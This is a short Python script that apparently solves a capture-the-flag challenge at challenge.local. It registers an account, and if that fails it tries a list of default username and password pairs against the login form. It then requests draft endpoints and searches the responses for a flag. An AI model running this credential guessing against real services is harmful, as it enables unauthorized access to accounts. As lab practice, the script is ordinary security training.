import requests
import time

BASE_URL = "http://challenge.local"
session = requests.Session()

print("[*] Starting authentication process...\n")

# Try registration
print("=" * 60)
print("[1] Attempting registration...")
timestamp = int(time.time())
username = f"user{timestamp}"
password = "Pass123!"

# GET /register
resp = session.get(f"{BASE_URL}/register")
print(f"GET /register: {resp.status_code}")
print(f"Cookies after GET: {dict(session.cookies)}")

# POST /register
data = {"username": username, "password": password, "confirm_password": password}
resp = session.post(f"{BASE_URL}/register", data=data)
print(f"POST /register: {resp.status_code}")
print(f"Cookies after POST: {dict(session.cookies)}")
print(f"Final URL: {resp.url}")
print(f"Response preview: {resp.text[:300]}")

authenticated = bool(session.cookies) or "dashboard" in resp.url

# Try common credentials if registration failed
if not authenticated:
    print("\n" + "=" * 60)
    print("[2] Trying common credentials...")
    
    creds = [("alice", "alice"), ("bob", "bob"), ("admin", "password"), ("user", "password")]
    
    for user, pwd in creds:
        session.cookies.clear()
        resp = session.post(f"{BASE_URL}/login", data={"username": user, "password": pwd})
        print(f"Login {user}/{pwd}: {resp.status_code} - Cookies: {dict(session.cookies)}")
        
        if session.cookies or "dashboard" in resp.url:
            print(f"[+] Success with {user}/{pwd}!")
            authenticated = True
            break

# Access draft endpoints
print("\n" + "=" * 60)
print("[3] Accessing endpoints...")
print(f"Current session cookies: {dict(session.cookies)}\n")

endpoints = ["/dashboard", "/api/drafts", "/user/drafts"]

for endpoint in endpoints:
    try:
        resp = session.get(f"{BASE_URL}{endpoint}")
        print(f"\n--- {endpoint} ---")
        print(f"Status: {resp.status_code}")
        print(f"Length: {len(resp.text)} chars")
        print(f"Response:\n{resp.text}")
        
        if "FLAG{" in resp.text:
            print(f"\n[!!!] FLAG FOUND at {endpoint}!")
            
    except Exception as e:
        print(f"Error accessing {endpoint}: {e}")

print("\n" + "=" * 60)
print(f"[*] Final session state: {dict(session.cookies)}")

